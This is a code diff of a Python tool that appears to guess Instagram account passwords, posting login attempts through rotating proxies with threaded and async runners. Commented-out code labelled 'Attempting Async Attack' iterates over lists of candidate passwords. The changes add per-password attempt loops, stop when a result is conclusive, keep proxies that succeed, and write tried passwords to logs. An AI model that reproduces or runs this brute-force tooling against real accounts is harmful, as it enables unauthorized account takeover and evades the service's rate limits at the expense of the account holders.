@@ -37,7 +37,7 @@ future = session.get('https://api.ipify.org?format=json')
 TokenTaskContext = collections.namedtuple('TokenTaskContext',
     'name proxy session')
 LoginTaskContext = collections.namedtuple('LoginTaskContext',
-    'name proxy token session')
+    'name proxy token session password')
 
 
 class request_handler(object):
@@ -82,14 +82,14 @@ class token_handler(request_handler):
         try:
             response.raise_for_status()
         except requests.exceptions.HTTPError as e:
-            log.warning(str(e), extra=extra)
+            log.warning(e, extra=extra)
             return None
         else:
             try:
                 token = self._get_token_from_response(response)
             except exceptions.TokenNotInResponse as e:
                 if not self.silenced:
-                    log.warning(str(e), extra=extra)
+                    log.warning(e, extra=extra)
                 return None
             else:
                 return token
@@ -120,7 +120,7 @@ class token_handler(request_handler):
             )
         except requests.exceptions.ConnectionError as e:
             if not self.silenced:
-                log.error(str(e), extra=extra)
+                log.error(e, extra=extra)
             return None
         else:
             token = self._handle_client_response(response, log, extra=extra)
@@ -191,11 +191,10 @@ class login_handler(request_handler):
         super(login_handler, self).__init__(global_stop_event, queues)
         self.user = user
 
-    @property
-    def login_data(self):
+    def login_data(self, password):
         return {
             'username': self.user.username,
-            'password': self.user.password,
+            'password': password
         }
 
     def _headers(self, token):
@@ -268,7 +267,7 @@ class async_login_handler(login_handler):
                 return self._handle_client_response(response, log, extra=extra)
 
         except aiohttp.ClientError as exc:
-            log.error(str(exc), extra={
+            log.error(exc, extra={
                 'proxy': proxy,
                 'token': token,
             })
@@ -286,7 +285,7 @@ class async_login_handler(login_handler):
             )
         except aiohttp.exceptions.ConnectionError as e:
             if not self.silenced:
-                log.error(str(e), extra=extra)
+                log.error(e, extra=extra)
             return None
         else:
             # TODO: For client responses, we might want to raise a harder exception
@@ -349,12 +348,12 @@ class futures_login_handler(login_handler):
                 try:
                     result = self._get_result_from_response(response)
                 except exceptions.ResultNotInResponse:
-                    log.warning(str(e), extra=extra)
+                    log.warning(e, extra=extra)
                     return None
                 else:
                     return result
             else:
-                log.warning(str(e), extra=extra)
+                log.warning(e, extra=extra)
                 return None
         else:
             try:
@@ -366,38 +365,39 @@ class futures_login_handler(login_handler):
                 return result
 
     @auto_logger("Login")
-    def request(self, session, proxy, token, task_name, log):
+    def request(self, context, log):
 
         extra = {
-            'task': task_name,
-            'proxy': proxy,
+            'task': context.name,
+            'proxy': context.proxy,
             'url': settings.INSTAGRAM_LOGIN_URL,
-            'token': token,
+            'token': context.token,
+            'password': context.password,
         }
 
         if not self.silenced:
             log.info("Sending POST Request", extra=extra)
         try:
-            response = session.post(
+            response = context.session.post(
                 settings.INSTAGRAM_LOGIN_URL,
-                headers=self._headers(token),
-                data=self.login_data,
+                headers=self._headers(context.token),
+                data=self.login_data(context.password),
                 timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
                 proxies={
-                    'http': format_proxy(proxy),
-                    'https': format_proxy(proxy, scheme='https'),
+                    'http': format_proxy(context.proxy),
+                    'https': format_proxy(context.proxy, scheme='https'),
                 },
             )
         except requests.exceptions.ConnectionError as e:
             if not self.silenced:
-                log.error(str(e), extra=extra)
+                log.error(e, extra=extra)
             return None
         else:
             # TODO: For client responses, we might want to raise a harder exception
             # if we get a 403.
             return self._handle_client_response(response, log, extra=extra)
 
-    async def task_generator(self, log, **context):
+    async def task_generator(self, log, password, **context):
         index = 0
         while not self.stop_event.is_set() and index <= self.ATTEMPT_LIMIT:
             proxy = await self.queues.proxies.get_best()
@@ -406,6 +406,7 @@ class futures_login_handler(login_handler):
             _context = LoginTaskContext(
                 name=f'Login Task {index}',
                 proxy=proxy,
+                password=password,
                 **context,
             )
 
@@ -415,21 +416,30 @@ class futures_login_handler(login_handler):
 
             yield _context
 
-    @auto_logger("Attempting Sync Login")
-    async def sync(self, token, log):
+    @auto_logger("Login")
+    async def sync(self, token, password, log):
 
         session = requests.Session()
-        async for context in self.task_generator(log, session=session, token=token):
-            result = self.request(
-                context.session, context.proxy, context.token, context.name)
-            if result and result.accessed:
-                self.queues.proxies.good.put_nowait(context.proxy)
+        while not self.stop_event.is_set():
+            # We probably want this block to run synchronously because this represents
+            # a series of attempts for a single password over a range of proxies.
+            async for context in self.task_generator(log, password,
+                    session=session, token=token):
+                result = self.request(context)
+                if result:
+                    if result.has_error:
+                        log.warning(result.error_message, extra={
+                            'token': token,
+                            'password': password,
+                            'task': context.name,
+                        })
+                    elif result.conclusive:
+                        self.queues.proxies.good.put_nowait(context.proxy)
+                        self.stop_event.set()
+                        return result
 
-                self.stop_event.set()
-                return result
-
-    @auto_logger("Attempting Login")
-    async def __call__(self, token, log):
+    @auto_logger("Login")
+    async def concurrent(self, token, password, log):
         """
         TODO: We are going to want to start putting proxies back in the queue
         if they resulted in successful requests.
@@ -439,35 +449,68 @@ class futures_login_handler(login_handler):
         with concurrent.futures.ThreadPoolExecutor(max_workers=self.THREAD_LIMIT) as executor:
             session = requests.Session()
 
-            async for context in self.task_generator(log, session=session, token=token):
+            while not self.stop_event.is_set():
+                # We probably want this block to run synchronously because this represents
+                # a series of attempts for a single password over a range of proxies.
+                async for context in self.task_generator(log, password,
+                        session=session, token=token):
 
-                login_future = executor.submit(
-                    self.request, context.session, context.proxy, context.token, context.name)
-                setattr(login_future, '__context__', context)
+                    login_future = executor.submit(self.request, context)
+                    setattr(login_future, '__context__', context)
 
-                futures.append(login_future)
+                    futures.append(login_future)
 
-            for future in concurrent.futures.as_completed(futures):
-                log.debug("Finished Task", extra={
-                    'task': future.__context__.name,
-                    'proxy': future.__context__.proxy,
-                })
-                result = future.result()
-                # We are going to have to distinguish between accessed and not
-                # accessed when there are generic type errors, but either one means
-                # that we should be returning the result.
-                if result and result.accessed:
-                    async with self.silence():
-                        self.stop_event.set()
-                        executor.shutdown()
+                for future in concurrent.futures.as_completed(futures):
+                    log.debug("Finished Task", extra={
+                        'task': future.__context__.name,
+                        'proxy': future.__context__.proxy,
+                    })
+                    result = future.result()
+                    if result:
+                        if result.has_error:
+                            log.warning(result.error_message, extra={
+                                'token': token,
+                                'password': password,
+                                'task': context.name,
+                            })
+                        elif result.conclusive:
+                            async with self.silence():
+                                self.stop_event.set()
+                                executor.shutdown()
 
-                    self.queues.proxies.good.put_nowait(future.__context__.proxy)
-                    return result
+                            self.queues.proxies.good.put_nowait(future.__context__.proxy)
+                            return result
+
+
+# class futures_multiple_login_handler(login_handler):
+
+#     @auto_logger("Attempting Sync Attack")
+#     async def sync(self, token, log):
+#         pass
+
+#     @auto_logger("Attempting Async Attack")
+#     async def concurrent(self, token, log):
+#         futures = []
+
+#         with concurrent.futures.ThreadPoolExecutor(max_workers=self.THREAD_LIMIT) as executor:
+#             for password in self.user.get_new_attempts():
+#                 password_future = executor.submit(
+#                     self.concurrent_attempt_with_password, token, password)
+#                 setattr(password_future, '__context__', context)
+#                 futures.append(password_future)
+
+#             for future in concurrent.futures.as_completed(futures):
+#                 log.debug("Finished Task", extra={
+#                     'task': future.__context__.name,
+#                     'proxy': future.__context__.proxy,
+#                 })
+#                 result = future.result()
 
 
 class Login(object):
 
     def __init__(self, user, global_stop_event, queues, config):
+        self.user = user
 
         self.futures_login_handler = futures_login_handler(user, global_stop_event, queues)
         self.token_handler = token_handler(global_stop_event, queues)
@@ -478,16 +521,35 @@ class Login(object):
 
 class FuturesLogin(Login):
 
+    @property
+    def methods(self):
+        # We are also going to have to incorporate --test, because the test
+        # mode should refer to only a single password being used.
+        return {
+            'sync': self.futures_login_handler.sync,
+            'async': self.futures_login_handler.concurrent,
+        }
+
     @auto_logger("Login")
     async def login(self, loop, log):
         token = await self.token_handler()
+        if token is None:
+            raise exceptions.FatalException(
+                "The allowable attempts to retrieve a token did not result in a "
+                "valid response containing a token.  This is most likely do to "
+                "a connection error."
+            )
+
         log.success("Set Token", extra={'token': token})
 
-        if self.config.sync:
-            result = await self.futures_login_handler.sync(token)
+        # Check if --test was provided, and if so only use one password that is
+        # attached to user object.
+        method = self.methods[self.config.mode]
+        result = await method(token, self.user.password)
+        if result.authorized:
+            log.success('Authenticated')
         else:
-            result = await self.futures_login_handler(token)
+            log.success('Not Authenticated')
+            print(result.__dict__)
 
-        log.success('Got Login Result')
-        log.success(result)
         self.global_stop_event.set()
